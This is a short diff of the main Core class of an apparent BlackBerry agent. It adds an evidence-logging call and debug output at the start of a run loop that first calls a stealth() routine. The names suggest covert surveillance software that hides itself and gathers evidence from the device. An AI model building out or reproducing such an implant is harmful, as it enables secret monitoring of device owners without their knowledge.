@@ -20,6 +20,7 @@ import net.rim.device.api.system.CodeModuleGroupManager;
 import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
+import blackberry.evidence.Evidence;
 import blackberry.fs.Path;
 import blackberry.utils.Utils;
 
@@ -65,7 +66,6 @@ public final class Core implements Runnable {
      * Instantiates a new core.
      */
     private Core() {
-
         Path.makeDirs();
 
         //#ifdef DEBUG
@@ -215,11 +215,14 @@ public final class Core implements Runnable {
      * 
      * @return true, if successful
      */
-    public void run() {
+    public void run() { 
+        //#ifdef DEBUG
+        debug.info("START: " + (new Date()));
+        //#endif
+        Evidence.info("START");
+   
         stealth();
-
-        Utils.sleep(500);
-
+        Utils.sleep(500);     
         try {
             for (;;) {
                 //#ifdef DEBUG
